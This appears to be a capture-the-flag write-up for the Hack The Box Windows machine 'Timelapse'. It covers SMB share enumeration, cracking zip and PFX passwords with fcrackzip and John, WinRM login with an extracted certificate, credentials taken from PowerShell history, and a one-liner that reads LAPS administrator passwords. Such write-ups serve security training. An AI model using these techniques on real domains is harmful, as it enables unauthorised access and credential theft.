`Box: Windows`
`Level: Easy`
### Index
1. [`Box Info`](#`Box%20Info`)
2. [`Initial Nmap Enum`](#`Initial%20Nmap%20Enum`)
3. [`SMB Enumerations`](#`SMB%20Enumerations`)
	1. [`John to Crack Certificate Password`](#`John%20to%20Crack%20Certificate%20Password`)
	2. [`User Flag Captured`](#`User%20Flag%20Captured`)
4. [`LDAP Enumeration`](#`LDAP%20Enumeration`)
	1. [`Dumping NamingContext`](#`Dumping%20NamingContext`)
5. [`Privilege Escalation`](#`Privilege%20Escalation`)
	1. [`Enum as svc_deploy`](#`Enum%20as%20svc_deploy`)
	2. [`Shell As Administrator`](#`Shell%20As%20Administrator`)

### `Box Info`
```
Timelapse is an Easy Windows machine, which involves accessing a publicly accessible SMB share that contains a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted PFX file, which can be cracked with John as well, by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration shows that `svc_deploy` is part of a group named `LAPS_Readers`. The `LAPS_Readers` group has the ability to manage passwords in LAPS and any user in this group can read the local passwords for machines in the domain. By abusing this trust we retrieve the password for the Administrator and gain a WinRM session.
```

### `Initial Nmap Enum`
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn 10.10.11.152
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-10-17 12:23:18Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-10-17T12:24:51+00:00; +7h59m58s from scanner time.
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
```

This is a classic scenario where port 80/443 is not open. I will start with SMB.

### `SMB Enumerations`
```
# netexec smb 10.10.11.152 -u 'Guest' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\Guest: 
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share 
```

So we have a domain `dc01.timelapse.htb`. Let's add it to host file. Following to that accessing the `Shares`
```
# smbclient //10.10.11.152/Shares
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (13.5 KiloBytes/sec) (average 13.5 KiloBytes/sec)

smb: \HelpDesk\> get LAPS_Datasheet.docx 
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (210.7 KiloBytes/sec) (average 155.3 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (782.0 KiloBytes/sec) (average 495.8 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx 
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (452.1 KiloBytes/sec) (average 491.6 KiloBytes/sec)
```

Getting all the files except that one .msi file. Now checking out Metadata for those files.

```
# exiftool LAPS_Datasheet.docx
File Name                       : LAPS_Datasheet.docx
Directory                       : .
File Size                       : 104 kB
File Modification Date/Time     : 2024:10:17 00:57:27-04:00
File Access Date/Time           : 2024:10:17 00:57:27-04:00
File Inode Change Date/Time     : 2024:10:17 00:57:27-04:00
File Permissions                : -rw-r--r--
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0xade293d8
Zip Compressed Size             : 485
Zip Uncompressed Size           : 3094
Zip File Name                   : [Content_Types].xml
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Enabled: True
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_SiteId: 72f988bf-86f1-41af-91ab-2d7cd011db47
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Owner: vishalch@microsoft.com
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_SetDate: 2018-06-07T16:51:33.9925251Z
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Name: General
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Application: Microsoft Azure Information Protection
MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Extended_MSFT_Method: Automatic
Sensitivity                     : General
```

Couple of things to note: `Owner: vishalch@microsoft.com`. Potential User. I also checked out the metadata for other two Docx file. Than I found the metadata for the zip file.
```
# exiftool winrm_backup.zip                                 
ExifTool Version Number         : 12.76
File Name                       : winrm_backup.zip
Directory                       : .
File Size                       : 2.6 kB
File Modification Date/Time     : 2024:10:17 00:56:56-04:00
File Access Date/Time           : 2024:10:17 00:56:56-04:00
File Inode Change Date/Time     : 2024:10:17 00:56:56-04:00
File Permissions                : -rw-r--r--
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0x0009
Zip Compression                 : Deflated
Zip Modify Date                 : 2021:10:25 14:21:20
Zip CRC                         : 0x12ec5683
Zip Compressed Size             : 2405
Zip Uncompressed Size           : 2555
Zip File Name                   : legacyy_dev_auth.pfx
```

Looks like the zip file has a sort of certificate. 
```
# unzip winrm_backup.zip                      
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

Unzipping the file needs a password. Let's try to crack the password using `fcrackzip`. 
```
# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip          


PASSWORD FOUND!!!!: pw == supremelegacy

```

Extracting the zip file 
```
# unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```
###### `John to Crack Certificate Password`
```
# exiftool legacyy_dev_auth.pfx                  
ExifTool Version Number         : 12.76
File Name                       : legacyy_dev_auth.pfx
Directory                       : .
File Size                       : 2.6 kB
File Modification Date/Time     : 2021:10:25 10:21:20-04:00
File Access Date/Time           : 2021:10:25 10:21:20-04:00
File Inode Change Date/Time     : 2024:10:17 01:30:31-04:00
File Permissions                : -rwxr-xr-x
Error                           : Unknown file type
```

Using `pfx2john` will convert our .pfx file into the format that John can process by generating hash and crack the password.
```
# pfx2john legacyy_dev_auth.pfx       
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d491da6d53ca889d95f094572da48eed1a4a14cd88bbfff72924328212c0ff047b42d0b7062b3c6191bc2c23713f986d1febf6d9e1829cd6663d2677b4af8c7a25f7360927c498163168a2543fd722188558e8016f59819657759c27000d365a302da21eda4b73121dcc4eede60533b0ef0873a99b92cc7f824d029385fa8b6859950912cd0a257fa55f150c2135f2850832b3229033f2552f809e70010fab8868bb7d5bef7c20408dac3f67e367f4c3e3b81a555cdfe9e89c7bc44d6996f401f9a26e43094b6fa418a76d5b57579eeb534627a27fd46350a624b139d9ff4b124c9afbbbe42870026098bbc7d38b6b543ab6eff3cf2972c87dd2c0e703ef2a0120062a97279661b67ca596a650efde28e098c82fce01f50611e28d4a6d5d75af8bf965c07faa68331b9f66733deb32ee3628b156ee0ef8e63b732e3606f3c6c9453b49d15592648cd918deaf72889f3e0bcf42bfdb9cddae7e77c5934579d658bfea78800013f36de7e7fadd2f0ff96e78dedaba0593947f96989fad67e17470b49307b5199248fbad36a0dee42e480b30785810a4c17cc27b0e0ed3a99ddec9720a968f3ccbffb36752febbbca437ecacd6c93c6ef2ff6277de01545a482daf34d1faf38819737b7e4ef61004c2876715123fd0b8a4f6c03eb387fd50eaaf4977870a6c011c91f1c9093dc2aa0e2c72c0a5e1473ef89429b02ab1efbf09b096efecb65d6e772d8eb2ca2e72aa288749d6fdbf9b207592f3a9ad16676d9f0aba1fb2f180f7b715b6c2238a42c13b00f8dc26c41ababbca74b84b42294ff473a0f16c85ac7f2072981968f8b868885655f50ea81f06e5e65d269853e537e18268add9046681f9a6d0233d171f900b34cf0c63d299eb67d7a8ebfcfbf88395de5c7fd5bd1085d20cc56b3ca847e6f21fba58215ff91bed70e5f629c9257baa848f29fab2efb9170f8c51e680dde4d6d2eebaa602b24444f43ccfb607efa46f378539664c6309f51d82f67347fc689e855966069099dead6f19adadcf9c6a0d2c42401846eba828bffad6f7336df1ea091844f2074e976a5d2eb83db0646fb43b3faad564ac577781f29de95b7b21b6caf7f9de6d2d56150de098faf9a684b2a79083b3555455272874e9c427e1b1349b94c0baf73eee08832274df7c4ac23b68f66cb86ba0561e1bb83b0e920b4568371c89c2a80ed63308a4d9ce2e12d74de3f83fe5d93ab3aadd65a8821814f9981e20cdb86615d04ef9d45c30d692ad058212b33a0c8966414b3840a77af33b2fe85791a16e4922a9458cb584903515470d57607ce412e0699c883ddd40ad4983f9e6164879a19fc554781823782c89b47c3bf36a6eb4d33194753e85cb13e112a3e9fce98b72565961d1bace71a8086657bce391bdb2a5e4b8025b06984fbb2da341034e9750b33ef2a1dccddde7b867084faf8264a4379c17dfad736a382fa7510e674ca7fefba611cc64313242d3166a04165d4f70607bd988181f06ff4dca04035c14111c7d93a1169efcece8c3616e971131ff54c42a35f3c43f374131b8634999052aa7a479274f6b9d64e414d2775fcf8f7e68897032902547c92885136f0f14e04e62519a02c03a4d0bf412e517f4b51e42ff27b40d7222d722424c56abb1b183158fef0f9d04bbc45d5341a4cb26d03a5864a6f51b9bd315918aa491393a5b6dc622dad6b25e131e43077ab421c4bcd6ed6dfbd52afd4dcb19a27797cbf983181e2300d06092b06010401823711023100301306092a864886f70d0109153106040401000000305d06092a864886f70d01091431501e4e00740065002d00340061003500330034003100350037002d0063003800660031002d0034003700320034002d0038006400620036002d006500640031003200660032003500630032006100390062305d06092b060104018237110131501e4e004d006900630072006f0073006f0066007400200053006f0066007400770061007200650020004b00650079002000530074006f0072006100670065002000500072006f007600690064006500723082038506092a864886f70d010701a0820376048203723082036e3082036a060b2a864886f70d010c0a0103a08203423082033e060a2a864886f70d01091601a082032e0482032a308203263082020ea00302010202101d9989298acf11bb4193a1cff44e12df300d06092a864886f70d01010b050030123110300e06035504030c074c656761637979301e170d3231313032353134303535325a170d3331313032353134313535325a30123110300e06035504030c074c65676163797930820122300d06092a864886f70d01010105000382010f003082010a0282010100a55607a36216471ee2f34d23ad6171ce8b9eb34a872bf689bce78603bbfeaa1c16b835ff3114fe8834d04d9585af0310af28cf1a42c1e9bf7b68a70a50f986d1643bb5371ca1bdf34d4d15e3745415f672222a4a303adea01b617ef4ee60545e0f0271cf9be6183f0b1ba1191857c40ea73222e8d319803089ae02125999941ea4e1c9b156ffb3ce99ed60b3ab623755c5a0fbb5ccd3986882f776d65a6b35dc2f0e88a532513c90161adb6ac85a26998ac9a82cc249a5aef631b4a7584a2bb9a4eb0bc1491f107c75b6a97f7e35b2ca7a00adfbf8c06babb657d96ef8adcc0b635a4b33a8222e472cc8e7aee8d1a02c77bfa6572f428f085cc3304a8b1491f10203010001a3783076300e0603551d0f0101ff0404030205a030130603551d25040c300a06082b0601050507030230300603551d1104293027a025060a2b060104018237140203a0170c156c6567616379794074696d656c617073652e687462301d0603551d0e04160414ccd90ee4af209eb0752bfd81961eac2db1255819300d06092a864886f70d01010b050003820101005f8efb76bfde3efe96fdda72c84b8ae76bb0882aba9a9bdeba1fc905eadee91d93e510364caf5eeee7492f4cdd43e0fb650ae77d49a3eca2449b28da05817d4a357e66ef6174dca08b226875cf896dc6c73a2603a09dc0aa7457d7dedd04cb747b286c7aade2edbd4e0567e9e1be55d3789fcf01773f7f06b6adf88fb1f579d564ce604cdc8299e074726d06a9ae370ded9c42a680caa9eb9298ce9293bef335263848e6dc4686a6dd59b9f6952e308c6cb7606459c3aa0cebaec6175dd5ab65f758764ae4d68ffb929ac1dfc9f8cb3aae26343c36e19f1d78def222a0760c8860a72ac1dd5a232b1b65162cea1e52b9549a9af4ebd918fe79fbfb34846b6a403115301306092a864886f70d0109153106040401000000$86b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
```


```
# pfx2john legacyy_dev_auth.pfx > timelapse.john

# john --wordlist=/usr/share/wordlists/rockyou.txt timelapse.john 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

thuglegacy       (legacyy_dev_auth.pfx)     

1g 0:00:01:41 DONE (2024-10-17 01:34) 0.009809g/s 31694p/s 31694c/s 31694C/s thugways..thugers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

We got the password `thuglegacy`. So far we have two passwords. `supremelegacy` for that ZIP file and `thuglegacy` for the pfx file. Using OpenSSL let's grab the info for the certificate.

```
# openssl pkcs12 --info -in legacyy_dev_auth.pfx 
Enter Import Password: <!----thuglegacy---!>
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:   <!----thuglegacy---!>
Verifying - Enter PEM pass phrase:    <!----thuglegacy---!>
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQKOTwtuTYVTBsOYgo
vu/uGwICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEFH39C9yTcQcv+a0
cQzZE2sEggTQLtw3Q5Sxg+gMSJblNMlckwnsiqgNEh7uw16eiMHhDiMdUZvlJG+3
4qbr6eUfsTiVUTT6CP+cX8xYHnMXw7gsxtdkb2lfM2H1szPNAEWqbdl1K4eYQbaW
GM0ox9E2FwUN6jtmeG9hEPrAEP75PGbxxz4YW975QE51tcZ+xVDZ+iO+e4IWQNxa
m010N/X6fhwTHtRosMxZ+GU+mYkiin/M2Zv2CKUZizzViI7/KhB8+j5J0p4F+RTA
TkJUVNLe+6OG091+ai9191REasiKJCoTkYRp1eNGu9pb7Oz2NXket95U6/RqiEMq
4oP6YsMR4dZOh1AyA5JMYy6/596howNomgrsaKbtGqiRnvpfpBgx9iAHeUvLnt1k
xht2h3lX6X1N+GPu34Nos0QbBy5tWCDVAXF3hDGYIzy9EHWomGykuXK5msq5KXeh
tzrIWPE/rYNpe42DkPogbDI5LorBzeZgassYwIP2Ew1NEKWEJlNLjkAH4Bay0Fm/
TjQrZAR2ZAZI2m7BezyOkSMrhwdwfCS7xFVteRUwZUv+adWFOvMB8hNy4MZxz8Py
ywObqZJ9dcjyfZjoS73JgcVeGVMCZRFrMEnqjHdJpYPBgfgMiaiSkOO1iXq8uiGC
sDfdQ8p8BVbtXF1Ss0HmUhXGxhPcMSK75kjL07n6vis+VMCVVeOK+33mcvS71NqX
5dJ30fIrEaCWGOABNXQGFxemPqobFe7I1sFmId4hAjcRJkeBDwZz0saSvKR0peFR
oswHvF2/exazrR4KzmOS4MiVXM5kHKLrPoirweg7en5j1jJNwoQWF6P8rLYCLdos
Ee3imRck4i+ZfncROpOrh1AJEHXU1EjZkF64Nyrq5acI+KLfs9h1cpmjt4Q5gzbw
6IsGF/rN3PnRQQhccf9sz0xYr0utaizySg9ssRYIei0q6wjoPkgTYvM7SVJP2ysv
rQ3ZUzUakuclUiBZdXGCiwF5w4DPTMEFvoym6Oduk0wLeZQx7T6FFEbftwIRkqe9
V840dFTZOHCM8KR0Ief8cUJJVHkJMSHE8e8MoXbjegm5uMmlcboDb0lPH8xcNIk1
NSPih/TxoCwFpmh0bUHFSzOkd/Z/r4RM+tCiFUmTAG1lAs9geqEYlAXrrJv2U0bn
0I76LEt/uclOnfWa5gUGQDsNqiAhrOn1bjYFOAla2so69ebgWtTCQq4Py2BBWz3U
iYpZI6BieItjaeCfsT9iLhiOBjmrhP5qPllBH54daeZtswPe5T+huiC85oZ3YW8u
mHEOg9fIOjTsgXIIDtKlN3jXWeoixohW3GZ0Ia3WKZotTUtao0Fve/8IrboWGHau
vSQm2u0uGaRHnbOOjMafJrfaHlxqrFSmvl80TYiMelnjM4xZ/G4vdmQDAy5jE0Ck
lM3UkCunCs95KMnEMqzNQtE+c4AUFy7Yg/EsT0nxE17VH6R5P9XWevv91aY4PspO
EXKrLJyMmHfAnJVJMubiqEu7YrTvE/zTBLaSemGhAsaoRuPpjXISABe75RiT4cjN
aGxA6R75860n4GWak8svhZz1iH7UCdv5IBGx+XBsk0Z10cuC3HmlLuinoKusJZC2
3zILSr2mmZCg/FwaVt8jxtxxw8ukJH4BuejmnfbSVl7mfHEsDGEUZms=
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Data
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN=Legacyy
issuer=CN=Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

We will need to have a `.crt` Certificate File and Decrypted Private Key. If you notice above, We have an Encrypted Private Key.
```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Timelapse.htb]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password: <!---thuglegacy---!>
Enter PEM pass phrase: <!---thuglegacy---!>
Verifying - Enter PEM pass phrase: <!---thuglegacy---!>

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Timelapse.htb]
└─# cat legacyy_dev_auth.key
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQRv12Q2f8MYo9
<!........SNIPPED................!>
```
The Above command will get us the Encrypted Private Key.

```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Timelapse.htb]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt  
Enter Import Password: <!---thuglegacy---!>
```
The above command will get us the `.crt` Certificate file that we will use with `Evil-WinRM`.

```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Timelapse.htb]
└─# openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth_decrypted.key
Enter pass phrase for legacyy_dev_auth.key:
writing RSA key

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Timelapse.htb]
└─# cat legacyy_dev_auth_decrypted.key     
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsH
<!..............SNIPPED....................!>
```
Now we have the decrypted private key.

###### `User Flag Captured`
```
# evil-winrm -i 10.10.11.152 -c legacyy_dev_auth.crt -k legacyy_dev_auth_decrypted.key -p thuglegacy -u legacy -S
 
Evil-WinRM shell v3.5
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Warning: SSL enabled
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
0a45d************************
```


### `LDAP Enumeration`

###### `Dumping NamingContext`
```
# ldapsearch -H ldap://10.10.11.152 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=timelapse,DC=htb
namingcontexts: CN=Configuration,DC=timelapse,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
namingcontexts: DC=DomainDnsZones,DC=timelapse,DC=htb
namingcontexts: DC=ForestDnsZones,DC=timelapse,DC=htb

# search result
search: 2
result: 0 Success
```

### `Privilege Escalation`

`WinPEAS Findings`
```
########## AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!

########## PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B

########## Checking KrbRelayUp
#  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (TIMELAPSE) so it could be vulnerable.
# You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges



########## Users
# Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: legacyy
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, Development, Authentication authority asserted identity

########## Current Token privileges
# Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

########## Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  TIMELAPSE

########## Found History Files
File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

###### `PowerShell History`
```
*Evil-WinRM* PS C:\tmp> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

so we got the credentials for the user `svc_deploy` Let's login to user `svc_deploy` using `Evil-WinRM`. I had to use `-S` flag in the evil-winrm command which Enables the SSL. Otherwise it was not possible to get the shell
```
# evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

Again using `WinPEAS`

###### `Enum as svc_deploy`
`WinPEAS Findings`
```
########## Users
# Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: svc_deploy
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, LAPS_Readers, NTLM Authentication
```
``
The user `svc_deploy` is a part of `LAPS_Readers` group.

```
Windows Local Administrator Password Solution (Windows LAPS) is a Windows feature that automatically manages and backs up the password of a local administrator account on your Microsoft Entra joined or Windows Server Active Directory-joined devices.
```


Using the following one liner, I was able to grab the Administrator Password
```
*Evil-WinRM* PS C:\tmp> Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

Name ms-Mcs-AdmPwd
---- -------------
DC01 d3}g/Wy6&NB!cx]2ga{BxhWT
```

###### `Shell As Administrator`
Remember to use `-S` to enable SSL
```
# evil-winrm -i 10.10.11.152 -u Administrator -p 'd3}g/Wy6&NB!cx]2ga{BxhWT' -S
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

Get your Root Flag from the following place. 
```
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
21a****************************
```

